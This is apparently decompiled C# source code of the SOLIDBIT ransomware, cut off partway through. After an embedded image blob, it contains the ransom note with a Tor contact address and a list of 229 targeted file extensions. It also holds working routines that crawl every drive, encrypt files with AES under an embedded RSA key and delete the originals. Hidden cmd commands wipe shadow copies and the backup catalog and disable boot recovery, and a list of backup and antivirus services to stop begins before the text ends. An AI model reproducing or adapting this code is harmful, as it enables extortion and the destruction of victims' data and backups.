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RRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAf/Z");
		string text3 = (string_2 = "RESTORE-MY-FILES.txt");
		List<string> list = (list_0 = new List<string>
		{
			"***SOLIDBIT RANSOMWARE***", "", "Аll оf уоur files аrе еncrуptеd bу SOLIDBIT rаnsоmwаrе and you cannot", "decrypt it without our help. If you try to use any additional recovery software - the", "files might be damaged, so if you are willing to try - try it on the data of the lowest value.", "", "To make sure that we REALLY CAN recover data - we offer you to decrypt ", "samples. You can recover all your files safely and easily with us.", "", "Contact   ",
			"Download Tor Browser - https://www.torproject.org/download/ and install it", "Open the link below in Tor Browser and follow instructions on this page", "", "http://solidb2jco63vbhx4sfimnqmwhtdjk4jbbgq7a24cmzzkfse4rduxgid.onion", ""
		});
		string[] array = (string_3 = new string[229]
		{
			".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
			".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
			".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
			".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
			".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
			".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
			".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
			".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
			".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
			".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
			".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
			".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
			".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
			".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
			".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
			".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
			".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
			".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
			".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
			".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
			".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
			".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
			".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
		});
		Random random = (random_0 = new Random());
		IContainer container = (icontainer_0 = null);
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		if (smethod_7())
		{
			method_0();
			return;
		}
		bool createdNew = false;
		mutex_0 = new Mutex(initiallyOwned: true, "ec03f91ae56e478455e3786e91559194", out createdNew);
		if (!createdNew)
		{
			Environment.Exit(0);
		}
		list_0.Add("Decryption ID: 1-" + method_5(28) + "k8");
		smethod_5();
		method_8();
		smethod_1();
		smethod_2();
		smethod_3();
		smethod_4();
		method_9(string_1);
		smethod_6();
		method_0();
	}

	private void method_0()
	{
		((Control)this).Show();
		((Form)this).set_Opacity(100.0);
	}

	private string method_1(int int_0)
	{
		if (string_0 == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < int_0; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random_0.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return string_0;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine(" <Modulus>tI1QdGqsT4bL4DjpIAwQPPqTPhENwGLV8sa5FNk3MuoEr6xggj8yN9SFjwqy1NR5oXU1vwMwMH3jWCb0Cdqx1AgqlsWeRhkBlBS6aO3IQ/iIup5DPNQxpg6zbOitAWUmCOhRDkfw7LaNnYcGHreLqj2hRtNQzxUT9oCEgXE5WQ0S1lxLpLAlFcon/DyHtnoxcovwAZ3OYcL6tAbd0vzrNRqIBuzdu1g1dbQQJjr8EBqsL00ZlybUpPeNnHYQkm7zu+RXpPHXedKEtSYe+yodeRIZHMmKE+EtjPgM83kf/OdA5oytVoZVdyaS1ftnRVRzMujJcPshwnVlvR87/eJVHQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	private void method_2(string string_4)
	{
		Class0 @class = new Class0();
		@class.string_0 = string_4;
		@class.form1_0 = this;
		try
		{
			Class1 class2 = new Class1();
			class2.class0_0 = @class;
			class2.string_0 = Directory.GetFiles(@class.string_0);
			class2.bool_0 = true;
			Parallel.For(0, class2.string_0.Length, class2.method_0);
			class2.string_1 = Directory.GetDirectories(@class.string_0);
			Parallel.For(0, class2.string_1.Length, class2.method_1);
		}
		catch (Exception)
		{
		}
	}

	private bool method_3(string string_4)
	{
		string_4 = string_4.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string value = array2[num];
				if (string_4.Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private string method_4(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private string method_5(int int_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_0--)
		{
			stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	private void method_6(string string_4, string string_5, string string_6)
	{
		string path = string_4 + "." + method_1(4);
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(string_5.Split(new char[1] { '|' })[0]);
		byte[] bytes2 = Encoding.UTF8.GetBytes(string_5.Split(new char[1] { '|' })[1]);
		Aes aes = Aes.Create();
		aes.Mode = CipherMode.CBC;
		byte[] array = new byte[16];
		Array.Copy(bytes, 0, array, 0, 16);
		aes.Key = array;
		aes.IV = bytes2;
		CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(string_4, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(string_6);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(string_4, "?");
		File.Delete(string_4);
	}

	private string method_7(string string_4, string string_5)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_4);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(string_5.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private void method_8()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					Class3 @class = new Class3();
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					@class.string_0 = directoryInfo.Name;
					if (!Array.Exists(array, @class.method_0))
					{
						method_2(directories[j]);
					}
				}
			}
			else
			{
				method_2(driveInfo.ToString());
			}
		}
	}

	private static void smethod_0(string string_4)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + string_4;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void smethod_1()
	{
		smethod_0("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void smethod_2()
	{
		smethod_0("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void smethod_3()
	{
		smethod_0("wbadmin delete catalog -quiet");
	}

	private static void smethod_4()
	{
		//IL_018e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
